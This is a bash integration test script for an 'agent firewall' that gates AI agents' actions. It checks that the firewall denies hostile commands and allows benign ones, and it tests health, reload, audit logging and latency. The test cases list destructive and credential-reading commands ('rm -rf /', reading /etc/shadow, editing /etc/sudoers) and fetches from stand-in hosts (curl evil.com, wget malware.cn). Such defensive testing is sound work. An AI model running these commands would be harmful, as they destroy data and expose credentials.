#!/bin/bash
# Integration test runner for MODULE 2 - Agent Firewall.
# Starts the server, runs all /gate tests, /rules, /reload, /health,
# inspects audit.log, kills the server, writes test-report.txt.

set -u
cd "$(dirname "$0")"

export PATH=$HOME/.cargo/bin:$PATH

BIN=./target/release/agent-firewall
RULES=rules.pl
PORT=9002
AUDIT=audit.log
REPORT=test-report.txt

# Fresh state.
rm -f "$AUDIT" server.log
pkill -f "target/release/agent-firewall" 2>/dev/null
sleep 0.3

# --- helpers ---------------------------------------------------------------
PASS=0
FAIL=0
declare -a LINES

record() {
    # $1 = PASS|FAIL, $2 = label, $3+ = details
    local status="$1"; shift
    local label="$1"; shift
    local details="$*"
    LINES+=("[$status] $label — $details")
    if [ "$status" = "PASS" ]; then PASS=$((PASS+1)); else FAIL=$((FAIL+1)); fi
}

gate_call() {
    # $1 = action, $2 = args JSON, $3 = expected_allowed (true|false)
    local action="$1"
    local args="$2"
    local expected="$3"
    local label="$4"
    local body
    body=$(curl -s --max-time 5 -X POST http://127.0.0.1:$PORT/gate \
                -H 'Content-Type: application/json' \
                -d "{\"action\":\"$action\",\"args\":$args}")
    local allowed
    allowed=$(echo "$body" | sed -E 's/.*"allowed":(true|false).*/\1/')
    local us
    us=$(echo "$body" | sed -E 's/.*"evaluated_in_us":([0-9]+).*/\1/')
    local rule
    rule=$(echo "$body" | sed -E 's/.*"rule_matched":"?([^",]+)"?[},].*/\1/' | head -c 60)
    if [ "$allowed" = "$expected" ]; then
        record PASS "$label" "allowed=$allowed (expected $expected), eval=${us}us, rule=$rule"
    else
        record FAIL "$label" "allowed=$allowed (expected $expected), eval=${us}us, body=$body"
    fi
    # SLA check: < 1000 us
    if [ -n "$us" ] && [ "$us" -lt 1000 ]; then
        record PASS "SLA<$label" "evaluated_in_us=$us < 1000"
    else
        record FAIL "SLA<$label" "evaluated_in_us=$us >= 1000 (or missing)"
    fi
}

# --- start server ----------------------------------------------------------
setsid "$BIN" --rules "$RULES" --port "$PORT" --audit "$AUDIT" > server.log 2>&1 &
SRV_PID=$!
echo "server PID=$SRV_PID"

# Wait for health.
for i in $(seq 1 50); do
    if curl -s --max-time 1 http://127.0.0.1:$PORT/health > /dev/null 2>&1; then
        break
    fi
    sleep 0.1
done

if ! curl -s --max-time 2 http://127.0.0.1:$PORT/health > /dev/null 2>&1; then
    echo "ERROR: server did not start"
    cat server.log
    exit 1
fi

# --- tests -----------------------------------------------------------------
gate_call "execute" '["rm","-rf","/"]'         "false" "rm -rf / (ZeroPath)"
gate_call "execute" '["ls","-la"]'             "true"  "ls -la (ok)"
gate_call "edit_file" '"/etc/passwd"'          "false" "edit /etc/passwd"
gate_call "edit_file" '"/home/user/code.rs"'   "true"  "edit user file"
gate_call "read_file" '"/etc/shadow"'          "false" "read /etc/shadow"
gate_call "network" '"evil.com"'               "false" "network evil.com"
gate_call "execute" '["curl","http://evil.com"]' "false" "curl evil.com"
gate_call "execute" '["chmod","777","/etc"]'   "false" "chmod 777 wildcard"
gate_call "execute" '["wget","http://malware.cn"]' "false" "wget malware.cn"
gate_call "edit_file" '"/etc/sudoers"'         "false" "edit /etc/sudoers"
gate_call "read_file" '"/etc/sudoers"'         "false" "read /etc/sudoers"

# /health
HEALTH=$(curl -s --max-time 2 http://127.0.0.1:$PORT/health)
echo "HEALTH: $HEALTH"
HC=$(echo "$HEALTH" | sed -E 's/.*"status":"([^"]+)".*/\1/')
RC=$(echo "$HEALTH" | sed -E 's/.*"rules_loaded":([0-9]+).*/\1/')
if [ "$HC" = "ok" ] && [ "$RC" -gt 0 ]; then
    record PASS "/health" "status=$HC rules_loaded=$RC"
else
    record FAIL "/health" "body=$HEALTH"
fi

# /rules
RULES_RESP=$(curl -s --max-time 2 http://127.0.0.1:$PORT/rules)
RULES_N=$(echo "$RULES_RESP" | sed -E 's/.*"rules_loaded":([0-9]+).*/\1/')
if [ "$RULES_N" -gt 0 ]; then
    record PASS "/rules" "rules_loaded=$RULES_N"
else
    record FAIL "/rules" "body=$RULES_RESP"
fi

# /reload
RELOAD=$(curl -s --max-time 2 -X POST http://127.0.0.1:$PORT/reload)
RELOAD_OK=$(echo "$RELOAD" | sed -E 's/.*"ok":(true|false).*/\1/')
if [ "$RELOAD_OK" = "true" ]; then
    record PASS "/reload" "ok=true rules=$RULES_N"
else
    record FAIL "/reload" "body=$RELOAD"
fi

# --- audit log checks ------------------------------------------------------
sleep 0.2
AUDIT_LINES=$(wc -l < "$AUDIT" 2>/dev/null || echo 0)
GATE_CALLS=${#LINES[@]}
# gate calls were ~11 * 2 (gate + SLA) = 22 record() entries but only 11 /gate hits
# Count actual /gate calls from gate_call invocations: 11 calls.
if [ "$AUDIT_LINES" -ge 11 ]; then
    record PASS "audit.log" "lines=$AUDIT_LINES (>= 11 expected)"
else
    record FAIL "audit.log" "lines=$AUDIT_LINES (< 11 expected)"
fi

# Verify each audit line has a 64-char SHA-256 hex.
BAD=0
while IFS= read -r line; do
    sha=$(echo "$line" | sed -E 's/.*SHA256=([0-9a-f]+).*/\1/')
    if [ ${#sha} -ne 64 ]; then
        BAD=$((BAD+1))
    fi
done < "$AUDIT"
if [ "$BAD" -eq 0 ]; then
    record PASS "audit.sha256" "all lines have 64-hex SHA-256"
else
    record FAIL "audit.sha256" "$BAD lines with bad/missing SHA-256"
fi

# --- timing summary --------------------------------------------------------
AVG_US=$(grep -oE 'eval=[0-9]+us' /tmp/empty 2>/dev/null || true)
# compute average evaluated_in_us from the gate_call responses we re-pull:
# simpler: average the timings the server already returned by re-issuing a burst.
BURST_TOTAL=0
BURST_N=10
for i in $(seq 1 $BURST_N); do
    u=$(curl -s --max-time 2 -X POST http://127.0.0.1:$PORT/gate \
        -H 'Content-Type: application/json' \
        -d '{"action":"execute","args":["ls","-la"]}' \
        | sed -E 's/.*"evaluated_in_us":([0-9]+).*/\1/')
    BURST_TOTAL=$((BURST_TOTAL + u))
done
AVG=$((BURST_TOTAL / BURST_N))
if [ "$AVG" -lt 1000 ]; then
    record PASS "avg-SLA" "avg evaluated_in_us=$AVG (< 1000) over $BURST_N calls"
else
    record FAIL "avg-SLA" "avg evaluated_in_us=$AVG (>= 1000) over $BURST_N calls"
fi

# --- write report ----------------------------------------------------------
{
    echo "MODULE 2 - AGENT FIREWALL (ZÉRO-PATH) — TEST REPORT"
    echo "Generated: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
    echo "Binary:    $BIN"
    echo "Rules:     $RULES"
    echo "Port:      $PORT"
    echo "Audit:     $AUDIT"
    echo
    echo "=============================================="
    echo "PASS=$PASS  FAIL=$FAIL"
    echo "=============================================="
    echo
    for l in "${LINES[@]}"; do
        echo "$l"
    done
    echo
    echo "--- audit.log (first 5 lines) ---"
    head -5 "$AUDIT" 2>/dev/null
    echo
    echo "--- audit.log (last 3 lines) ---"
    tail -3 "$AUDIT" 2>/dev/null
    echo
    echo "--- server.log ---"
    cat server.log 2>/dev/null
} > "$REPORT"

echo
echo "==== TEST REPORT ===="
cat "$REPORT"

# --- shutdown --------------------------------------------------------------
kill -TERM "$SRV_PID" 2>/dev/null
sleep 0.3
kill -KILL "$SRV_PID" 2>/dev/null
pkill -f "target/release/agent-firewall" 2>/dev/null
echo
echo "Done. PASS=$PASS FAIL=$FAIL  -> $REPORT"
[ "$FAIL" -eq 0 ]
